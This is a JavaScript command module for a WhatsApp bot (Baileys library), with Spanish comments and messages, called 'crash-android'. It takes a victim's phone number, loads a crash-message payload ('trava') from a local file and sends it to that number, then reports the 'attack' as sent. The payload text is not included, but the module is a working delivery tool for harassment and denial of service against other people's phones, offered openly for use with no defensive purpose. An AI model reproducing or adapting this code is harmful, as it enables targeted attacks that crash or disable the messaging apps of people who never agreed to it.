/* * 👑 MISA CRASH-ANDROID (ULTIMATE FIX)
 * Ruta: comandos/crash-android.js
 */
import { jidDecode } from '@whiskeysockets/baileys'
import fs from 'fs'
import path from 'path'

const crashAndroidMisa = {
    name: 'crash-android',
    alias: ['ca', 'crash', 'ola'],
    category: 'tools',
    noPrefix: true,

    run: async (conn, m, { args, command }) => {
        try {
            // 1. Validación de número (Usando sendMessage en vez de m.reply)
            if (!args[0]) {
                return conn.sendMessage(m.chat, { 
                    text: `✧ ‧₊˚ *MISA CRASH* ୧ֹ˖ ⑅ ࣪⊹\n\n✰ \`Uso\`: ${command} [número]\n> ✐ *Ejemplo:* ${command} 1809xxxxxxx` 
                }, { quoted: m })
            }

            // 2. Limpieza y validación de JID
            let num = args[0].replace(/[^0-9]/g, '')
            if (!num || num.length < 8) {
                return conn.sendMessage(m.chat, { text: '❌ *El número es inválido.*' }, { quoted: m })
            }
            let targetJid = num + '@s.whatsapp.net'

            // 3. Ruta al archivo ola.js
            const travaPath = path.join(process.cwd(), 'travas', 'ola.js')
            if (!fs.existsSync(travaPath)) {
                return conn.sendMessage(m.chat, { text: '❌ No encontré `travas/ola.js`.' }, { quoted: m })
            }

            // 4. Leer contenido
            const contenido = fs.readFileSync(travaPath, 'utf-8')

            // 5. Reacción de confirmación
            await conn.sendMessage(m.chat, { react: { text: '💀', key: m.key } })

            // 6. ENVÍO DEL TRAVA AL OBJETIVO
            await conn.sendMessage(targetJid, { text: contenido })

            // 7. Mensaje de éxito en tu chat
            await conn.sendMessage(m.chat, { 
                text: `✅ *Ataque enviado a @${num}*`,
                mentions: [targetJid]
            }, { quoted: m })

        } catch (err) {
            console.error('[ERROR EN CRASH-ANDROID]:', err)
        }
    }
}

export default crashAndroidMisa
